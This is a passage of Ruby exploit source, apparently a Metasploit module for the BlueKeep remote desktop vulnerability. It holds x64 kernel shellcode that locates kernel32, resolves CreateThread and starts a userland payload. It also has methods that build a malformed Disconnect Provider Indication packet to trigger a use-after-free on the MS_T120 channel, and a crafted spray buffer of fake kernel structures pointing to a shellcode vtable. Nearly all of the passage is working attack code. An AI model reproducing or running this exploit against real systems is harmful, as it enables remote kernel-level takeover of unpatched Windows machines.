    mov rax, [rax + 0x18]       ; PEB->Ldr
    mov rax, [rax + 0x20]       ; InMemoryOrder list

    ;lea rsi, [rcx + rdx]    ; rsi = ThreadListHead address
    ;mov rbx, rsi    ; use rbx for iterating thread
_find_kernel32_dll_loop:
    mov rax, [rax]       ; first one always be executable
    ; offset 0x38 (WORD)  => must be 0x40 (full name len c:\windows\system32\kernel32.dll)
    ; offset 0x48 (WORD)  => must be 0x18 (name len kernel32.dll)
    ; offset 0x50  => is name
    ; offset 0x20  => is dllbase
    ;cmp word [rax+0x38], 0x40
    ;jne _find_kernel32_dll_loop
    cmp word [rax+0x48], 0x18
    jne _find_kernel32_dll_loop

    mov rdx, [rax+0x50]
    ; check only "32" because name might be lowercase or uppercase
    cmp dword [rdx+0xc], 0x00320033   ; 3\x002\x00
    jnz _find_kernel32_dll_loop

    ;int3
    mov r15, [rax+0x20]
    mov edi, #{createthread_hash}
    call get_proc_addr

    ; save CreateThread address to SystemArgument1
    mov [rbx], rax

_kernel_kapc_routine_exit:
    xor ecx, ecx
    ; clear queueing kapc flag, allow other hijacked system call to run shellcode
    mov byte [rbp+#{data_queueing_kapc_offset}], cl
    ; restore IRQL to APC_LEVEL
    mov cl, 1
    mov cr8, rcx

    pop r15
    pop rsi
    pop rdi
    pop rbx
    pop rbp
    ret


userland_start:
userland_start_thread:
    ; CreateThread(NULL, 0, &threadstart, NULL, 0, NULL)
    xchg rdx, rax   ; rdx is CreateThread address passed from kernel
    xor ecx, ecx    ; lpThreadAttributes = NULL
    push rcx        ; lpThreadId = NULL
    push rcx        ; dwCreationFlags = 0
    mov r9, rcx     ; lpParameter = NULL
    lea r8, [rel userland_payload]  ; lpStartAddr
    mov edx, ecx    ; dwStackSize = 0
    sub rsp, 0x20
    call rax
    add rsp, 0x30
    ret

userland_payload:
    ^

    [
      KERNELMODE_EGG,
      assemble_with_fixups(asm)
    ].pack('<Qa*')
  end

  def create_free_trigger(chan_user_id, chan_id)
    # malformed Disconnect Provider Indication PDU (opcode: 0x2, total_size != 0x20)
    vprint_status("Creating free trigger for user #{chan_user_id} on channel #{chan_id}")
    # The extra bytes on the end of the body is what causes the bad things to happen
    body = "\x00\x00\x00\x00\x00\x00\x00\x00\x02" + "\x00" * 22
    rdp_create_channel_msg(chan_user_id, chan_id, body, 3, 0xFFFFFFF)
  end

  def create_exploit_channel_buffer(target_addr)
    overspray_addr = target_addr + 0x2000
    shellcode_vtbl = target_addr + HEADER_SIZE
    magic_value1 = overspray_addr + 0x810
    magic_value2 = overspray_addr + 0x48
    magic_value3 = overspray_addr + CHUNK_SIZE + HEADER_SIZE

    # first 0x38 bytes are used by DATA PDU packet
    # exploit channel starts at +0x38, which is +0x20 of an _ERESOURCE
    # http://www.tssc.de/winint/Win10_17134_ntoskrnl/_ERESOURCE.htm
    [
      [
        # SystemResourceList (2 pointers, each 8 bytes)
        # Pointer to OWNER_ENTRY (8 bytes)
        # ActiveCount (SHORT, 2 bytes)
        # Flag (WORD, 2 bytes)
        # Padding (BYTE[4], 4 bytes) x64 only
        0x0, # SharedWaters (Pointer to KSEMAPHORE, 8 bytes)
        0x0, # ExclusiveWaiters (Pointer to KSEVENT, 8 bytes)
        magic_value2, # OwnerThread (ULONG, 8 bytes)
        magic_value2, # TableSize (ULONG, 8 bytes)
        0x0, # ActiveEntries (DWORD, 4 bytes)
        0x0, # ContenttionCount (DWORD, 4 bytes)
        0x0, # NumberOfSharedWaiters (DWORD, 4 bytes)
        0x0, # NumberOfExclusiveWaiters (DWORD, 4 bytes)
        0x0, # Reserved2 (PVOID, 8 bytes) x64 only
        magic_value2, # Address (PVOID, 8 bytes)
        0x0, # SpinLock (UINT_PTR, 8 bytes)
      ].pack('<Q<Q<Q<Q<L<L<L<L<Q<Q<Q'),
      [
        magic_value2, # SystemResourceList (2 pointers, each 8 bytes)
        magic_value2, # --------------------
        0x0, # Pointer to OWNER_ENTRY (8 bytes)
        0x0, # ActiveCount (SHORT, 2 bytes)
        0x0, # Flag (WORD, 2 bytes)
        0x0, # Padding (BYTE[4], 4 bytes) x64 only
        0x0, # SharedWaters (Pointer to KSEMAPHORE, 8 bytes)
        0x0, # ExclusiveWaiters (Pointer to KSEVENT, 8 bytes)
        magic_value2, # OwnerThread (ULONG, 8 bytes)
        magic_value2, # TableSize (ULONG, 8 bytes)
        0x0, # ActiveEntries (DWORD, 4 bytes)
        0x0, # ContenttionCount (DWORD, 4 bytes)
        0x0, # NumberOfSharedWaiters (DWORD, 4 bytes)
        0x0, # NumberOfExclusiveWaiters (DWORD, 4 bytes)
        0x0, # Reserved2 (PVOID, 8 bytes) x64 only
        magic_value2, # Address (PVOID, 8 bytes)
        0x0, # SpinLock (UINT_PTR, 8 bytes)
      ].pack('<Q<Q<Q<S<S<L<Q<Q<Q<Q<L<L<L<L<Q<Q<Q'),
      [
        0x1F, # ClassOffset (DWORD, 4 bytes)
        0x0, # bindStatus (DWORD, 4 bytes)
        0x72, # lockCount1 (QWORD, 8 bytes)
        magic_value3, # connection (QWORD, 8 bytes)
        shellcode_vtbl, # shellcode vtbl ? (QWORD, 8 bytes)
        0x5, # channelClass (DWORD, 4 bytes)
        "MS_T120\x00".encode('ASCII'), # channelName (BYTE[8], 8 bytes)
        0x1F, # channelIndex (DWORD, 4 bytes)
        magic_value1, # channels (QWORD, 8 bytes)
        magic_value1, # connChannelsAddr (POINTER, 8 bytes)
        magic_value1, # list1 (QWORD, 8 bytes)
        magic_value1, # list1 (QWORD, 8 bytes)
        magic_value1, # list2 (QWORD, 8 bytes)
        magic_value1, # list2 (QWORD, 8 bytes)
        0x65756c62, # inputBufferLen (DWORD, 4 bytes)
        0x7065656b, # inputBufferLen (DWORD, 4 bytes)
        magic_value1, # connResrouce (QWORD, 8 bytes)
        0x65756c62, # lockCount158 (DWORD, 4 bytes)
        0x7065656b, # dword15C (DWORD, 4 bytes)
      ].pack('<L<L<Q<Q<Q<La*<L<Q<Q<Q<Q<Q<Q<L<L<Q<L<L')
    ].join('')
  end

end
